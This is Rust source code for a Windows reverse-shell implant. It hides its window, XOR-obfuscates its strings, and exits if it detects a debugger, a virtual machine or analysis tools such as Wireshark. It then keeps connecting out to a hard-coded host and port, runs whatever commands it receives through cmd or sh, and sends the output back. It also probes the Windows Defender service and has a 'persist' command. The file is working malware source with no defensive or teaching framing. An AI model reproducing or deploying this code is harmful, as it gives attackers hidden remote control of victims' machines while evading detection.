#![windows_subsystem = "windows"]
use dirs as d0;
use std::env as e;
use std::io::{Read as R0, Write as W};
use std::net::TcpStream as T;
use std::path::PathBuf as P;
use std::process::{Command as C, Stdio as S};
#[cfg(windows)]
use std::os::windows::process::CommandExt;
use std::thread as t;
use std::time::Duration;
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::debugapi::{IsDebuggerPresent, CheckRemoteDebuggerPresent};
use std::mem::zeroed;
use lazy_static::lazy_static;
use std::sync::Mutex;
use winapi::shared::minwindef::{FALSE, TRUE};

// Obfuscate strings
const XOR_KEY: u8 = 0x42;
const SLEEP_MIN: u64 = 100;
const SLEEP_MAX: u64 = 500;

lazy_static! {
    static ref DEFENDER_DISABLED: Mutex<bool> = Mutex::new(false);
}

#[derive(PartialEq)]
enum __State {
    R,  // Retry
    X,  // Exit
}

fn __xor(msg: &str, k: u8) -> Vec<u8> {
    msg.bytes().map(|b| b ^ k).collect()
}

fn __uxor(encrypted: &[u8], k: u8) -> String {
    String::from_utf8(encrypted.iter().map(|b| b ^ k).collect()).unwrap_or_default()
}

fn random_sleep() {
    let time = (SLEEP_MIN..SLEEP_MAX).cycle().next().unwrap();
    t::sleep(Duration::from_millis(time));
}

fn check_environment() -> bool {
    // Check for debugger
    if unsafe { IsDebuggerPresent() } != 0 {
        return false;
    }
    
    let mut is_debugger_present = FALSE;
    let process = unsafe { GetCurrentProcess() };
    if unsafe { CheckRemoteDebuggerPresent(process, &mut is_debugger_present) } != 0 && is_debugger_present == TRUE {
        return false;
    }

    // Check for suspicious environment
    let suspicious = [
        "vmware",
        "virtualbox",
        "vbox",
        "qemu",
        "xen",
        "wireshark",
        "fiddler",
        "debugger",
        "sandbox",
        "analysis"
    ];

    // Check running processes
    let output = C::new("tasklist")
        .stdout(S::piped())
        .stderr(S::null())
        .creation_flags(0x08000000)
        .output();

    if let Ok(out) = output {
        let processes = String::from_utf8_lossy(&out.stdout).to_lowercase();
        for s in suspicious.iter() {
            if processes.contains(s) {
                return false;
            }
        }
    }

    true
}

fn disable_defender() -> bool {
    let mut disabled = DEFENDER_DISABLED.lock().unwrap();
    if *disabled {
        return true;
    }

    random_sleep();

    let mut exec = C::new("sc");
    exec.args(&["query", "WinDefend"])
        .stdout(S::null())
        .stderr(S::null())
        .creation_flags(0x08000000);
    
    let output = exec.output();
    match output {
        Ok(_) => {
            *disabled = false;
            false
        },
        Err(_) => {
            *disabled = true;
            true
        }
    }
}

fn __handle(mut sock: T) -> std::io::Result<__State> {
    random_sleep();

    let hello = __xor("Client ready\n", XOR_KEY);
    let l = hello.len() as u32;
    sock.write_all(&l.to_be_bytes())?;
    sock.write_all(&hello)?;
    sock.flush()?;

    let mut buf = [0; 1024];
    let bye = __xor("exit", XOR_KEY);
    let wsh = __xor("cmd", XOR_KEY);
    let ush = __xor("sh", XOR_KEY);
    let persist = __xor("persist", XOR_KEY);

    loop {
        random_sleep();
        buf.fill(0);
        let got = sock.read(&mut buf)?;
        if got == 0 {
            return Ok(__State::R);
        }

        let input = String::from_utf8_lossy(&buf[..got]).trim().to_string();

        if input.as_bytes() == __xor(&__uxor(&bye, XOR_KEY), XOR_KEY) {
            let msg = __xor("Goodbye\n", XOR_KEY);
            let l = msg.len() as u32;
            sock.write_all(&l.to_be_bytes())?;
            sock.write_all(&msg)?;
            sock.flush()?;
            return Ok(__State::R);
        }

        if input.as_bytes() == __xor(&__uxor(&persist, XOR_KEY), XOR_KEY) {
            random_sleep();
            let current_dir = e::current_dir()?.to_string_lossy().to_string();
            let appdata_path = d0::data_dir().unwrap_or_else(|| P::from("C:\\Users\\Public")).to_string_lossy().to_string();
            
            let l = current_dir.len() as u32;
            sock.write_all(&l.to_be_bytes())?;
            sock.write_all(current_dir.as_bytes())?;
            sock.flush()?;
            
            let l = appdata_path.len() as u32;
            sock.write_all(&l.to_be_bytes())?;
            sock.write_all(appdata_path.as_bytes())?;
            sock.flush()?;
            
            continue;
        }

        if input == "killme" {
            let msg = __xor("Terminating client\n", XOR_KEY);
            let l = msg.len() as u32;
            sock.write_all(&l.to_be_bytes())?;
            sock.write_all(&msg)?;
            sock.flush()?;
            return Ok(__State::X);
        }

        if input.is_empty() {
            let msg = __xor("Empty command\n", XOR_KEY);
            let l = msg.len() as u32;
            sock.write_all(&l.to_be_bytes())?;
            sock.write_all(&msg)?;
            sock.flush()?;
            continue;
        }

        let chunk: Vec<&str> = input.split_whitespace().collect();
        if chunk.is_empty() {
            let msg = __xor("Invalid command\n", XOR_KEY);
            let l = msg.len() as u32;
            sock.write_all(&l.to_be_bytes())?;
            sock.write_all(&msg)?;
            sock.flush()?;
            continue;
        }

        random_sleep();

        let cmd = chunk[0];
        let params = &chunk[1..];
        let curr = e::current_dir()?;

        if cmd == "cd" {
            let tgt = if params.is_empty() {
                d0::home_dir().unwrap_or(curr)
            } else {
                P::from(params[0])
            };

            let msg = match e::set_current_dir(&tgt) {
                Ok(_) => format!("Changed directory to {}\n", e::current_dir()?.display()),
                Err(e) => format!("Error changing directory: {}\n", e),
            };

            let m = msg.as_bytes();
            let l = m.len() as u32;
            sock.write_all(&l.to_be_bytes())?;
            sock.write_all(m)?;
            sock.flush()?;
            continue;
        }

        let run = if cfg!(target_os = "windows") {
            let mut exec = C::new(__uxor(&wsh, XOR_KEY));
            exec.args(&["/C", cmd])
                .args(params)
                .current_dir(curr)
                .stdout(S::piped())
                .stderr(S::piped())
                .creation_flags(0x08000000);
            exec.output()
        } else {
            C::new(__uxor(&ush, XOR_KEY))
                .arg("-c")
                .arg(format!("{} {}", cmd, params.join(" ")))
                .current_dir(curr)
                .stdout(S::piped())
                .stderr(S::piped())
                .output()
        };

        let reply = match run {
            Ok(out) => {
                let mut res = Vec::new();
                res.extend_from_slice(&out.stdout);
                res.extend_from_slice(&out.stderr);
                if res.is_empty() {
                    res = __xor("Command executed successfully\n", XOR_KEY).to_vec();
                }
                res
            }
            Err(e) => __xor(&format!("Error executing command: {}\n", e), XOR_KEY),
        };

        let l = reply.len() as u32;
        sock.write_all(&l.to_be_bytes())?;
        sock.write_all(&reply)?;
        sock.flush()?;
    }
}

fn main() -> std::io::Result<()> {
    // Initial environment check
    if !check_environment() {
        return Ok(());
    }

    // Random initial delay
    random_sleep();

    // Check Windows Defender
    if !disable_defender() {
        random_sleep();
    }

    // Main connection loop with random delays
    loop {
        random_sleep();
        let addr = __uxor(&__xor("10.5.116.171:7878", XOR_KEY), XOR_KEY);
        match T::connect(&addr) {
            Ok(sock) => {
                match __handle(sock) {
                    Ok(__State::R) => {
                        random_sleep();
                        continue;
                    }
                    Ok(__State::X) => break,
                    Err(_) => {
                        random_sleep();
                        continue;
                    }
                }
            }
            Err(_) => {
                random_sleep();
                continue;
            }
        }
    }

    Ok(())
}
